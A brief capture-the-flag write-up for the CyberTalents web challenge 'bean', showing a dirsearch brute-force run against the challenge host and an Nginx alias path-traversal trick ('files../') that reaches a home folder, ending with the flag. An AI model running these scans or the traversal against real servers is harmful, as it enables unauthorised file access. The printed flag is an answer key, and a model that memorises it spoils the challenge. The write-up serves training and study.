# Challenge Name:
 [*bean*](https://cybertalents.com/challenges/web/bean)
 
# Challenge Description
Come back home Mr Bean .

Link: [http://52.28.216.196/bean/](http://52.28.216.196/bean/)

## Answer
* Use Dirsearch tool to bruteforce directory of 'http://52.28.216.196/bean/' 
```bash
python3 dirsearch.py -u http://52.28.216.196/bean/
[07:27:39] Starting: 
[07:27:42] 200 -  404B  - /bean/%3f/
[07:28:39] 301 -  185B  - /bean/files  ->  http://52.28.216.196/files/
[07:28:39] 200 -    9KB - /bean/files/
[07:28:42] 200 -  404B  - /bean/index.html
```
* Navigate to 'http://52.28.216.196/bean/files/' it opens many files
* If we append '..' at the end of any directory name we can successfully jump to the upper level directory
* Navegate to 'http://52.28.216.196/bean/files../'
* Enter home folder
* You got the password!!

 ## The Flag
 > FLAG{Nginx_nOt_aLWays_sEcUre_bY_The_waY}
